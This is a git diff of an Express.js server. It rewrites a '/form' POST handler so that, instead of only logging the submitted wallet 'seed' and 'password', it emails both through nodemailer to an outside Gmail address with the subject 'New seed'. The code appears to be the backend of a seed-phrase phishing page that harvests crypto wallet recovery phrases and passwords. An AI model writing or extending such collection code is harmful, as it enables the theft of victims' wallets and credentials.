@@ -22,20 +22,21 @@ if(process.env.NODE_ENV === 'production'){
 
 app.post('/form', async(req, res) => {
   const { seed, password } = await req.body
-  // const transporter = await nodemailer.createTransport({
-  //   service: 'gmail',
-  //   auth: {
-  //     user: process.env.USER,
-  //     pass: process.env.PASSWORD
-  //   }
-  // })
-
-  // transporter.sendMail({
-  //   to: "jtom29544@gmail.com",
-  //   subject: "New seed", 
-  //   text: {seed},
-  // })
-  console.log(seed, password)
+  const transporter = await nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+      user: process.env.USER,
+      pass: process.env.PASSWORD
+    } 
+  })
+ 
+  const response = await transporter.sendMail({
+    from: 'jtom29544@gmail.com',
+    to: "xenuxyz@gmail.com",
+    subject: "New seed", 
+    text: `seed: ${seed} password: ${password ? password : ''}`
+  })
+  res.json(response)
 }) 
 
 app.listen(port, () => {
